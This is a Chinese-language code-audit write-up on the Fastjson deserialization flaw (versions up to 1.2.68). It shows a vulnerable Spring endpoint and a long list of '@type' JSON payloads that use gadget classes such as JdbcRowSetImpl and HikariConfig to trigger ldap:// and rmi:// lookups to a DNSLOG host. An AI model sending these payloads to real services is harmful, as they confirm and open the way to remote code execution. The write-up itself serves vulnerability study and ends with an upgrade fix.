ava代码审计之fastjson反序列化



# 可利用原因

Fastjson反序列化漏洞被利用的原因，可以归结为两方面：  
一、Fastjson提供了反序列化功能，允许用户在输入JSON串时通过 “@type”键对应的value指定任意反序列化类名；  
二、Fastjson自定义的反序列化机制会使用反射生成上述指定类的 实例化对象，并自动调用该对象的setter方法及部分getter方法。 攻击者可以构造恶意请求，使目标应用的代码执行流程进入这 部分特定setter或getter方法，若上述方法中有可被恶意利用的逻辑 （也就是通常所指的“Gadget”），则会造成一些严重的安全问题。 官方采用了黑名单方式对反序列化类名校验，但随着时间的推移及 自动化漏洞挖掘能力的提升。新Gadget会不断涌现，黑名单这种治 标不治本的方式只会导致不断被绕过，从而对使用该组件的用户带 来不断升级版本的困扰 对编程人员而言，在使用Fastjson反序列化时会使用到Fastjson所 提供的几个静态方法：

```
parse (String text) 
parseObject(String text) 
parseObject(String text, Class clazz)  
```

无论使用上述哪种方式处理JSON字符串，都会有机会调用目标类中 符合要求的Getter方法或者Setter方法，如果一个类中的Getter或 者Setter方法满足调用条件并且存在可利用点，那么这个攻击链就 产生了  
核心代码：

```
@RequestMapping(value = "/deserialize", method = {RequestMethod.POST})
    @ResponseBody
    public String Deserialize(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        try {
            // 将post提交的string转换为json
            JSONObject ob = JSON.parseObject(params);
            return ob.get("name").toString();
        } catch (Exception e) {
            return e.toString();
        }
    }
```

使用parseObject 来解析json字符串  
用POST方法打开，Content-Type设置为application/json，暴露使 用的fastjson  
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20220917%2F1663380223_63252aff22fa13cdbfabc.png%21small)

# 使用DNSLOG验证

```
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"name":
{"@type":"java.net.InetAddress","val":"dnslog"}}
{"@type":"java.net.InetSocketAddress"
{"address":,"val":"dnslog"}}
{"@type":"com.alibaba.fastjson.JSONObject",
{"@type": "java.net.URL", "val":"dnslog"}}""}
{{"@type":"java.net.URL","val":"dnslog"}:"aaa"}
Set[{"@type":"java.net.URL","val":"dnslog"}]
Set[{"@type":"java.net.URL","val":"dnslog"}
{{"@type":"java.net.URL","val":"dnslog"}:0
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari
.HikariConfig","metricRegistry":"ldap://dnslog/"}
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari
.HikariConfig","healthCheckRegistry":"ldap://dnslog/
"}
{"@type":"org.apache.shiro.realm.jndi.JndiRealmFacto
ry", "jndiNames":["ldap://dnslog/"], "Realms":[""]}
{"@type":"org.apache.xbean.propertyeditor.JndiConver
ter","asText":"ldap://dnslog/"}
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.J
taTransactionConfig","properties":
{"@type":"java.util.Properties","UserTransaction":"l
dap://dnslog/"}
{"@type":"org.apache.cocoon.components.slide.impl.JM
SContentInterceptor", "parameters":
{"@type":"java.util.Hashtable","java.naming.factory.
initial":"com.sun.jndi.rmi.registry.RegistryContextF
actory","topic-factory":"ldap://dnslog/"},
"namespace":""}
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","he
althCheckRegistry":"ldap://dnslog/"}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSource
Name":"ldap://dnslog/", "autoCommit":true}
{"@type":"org.apache.commons.proxy.provider.remoting
.SessionBeanProvider","jndiName":"rmi://dnslog/"}
{"@type":"org.apache.commons.proxy.provider.remoting
.SessionBeanProvider","jndiName":"ldap://dnslog/","O
bject":"a"}
{"@type":"com.zaxxer.hikari.HikariConfig","metricReg
istry":"ldap://dnslog/"}
{"@type":"com.zaxxer.hikari.HikariConfig","healthChe
ckRegistry":"ldap://dnslog/"}
{"@type":"com.zaxxer.hikari.HikariConfig","metricReg
istry":"rmi://dnslog/"}
{"@type":"com.zaxxer.hikari.HikariConfig","healthChe
ckRegistry":"rmi://dnslog/"}
```

![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20220917%2F1663380278_63252b3689019375e9f79.png%21small)

# 漏洞版本

fastjson <=1.2.68

# 修复

fastjson 升级到最新版本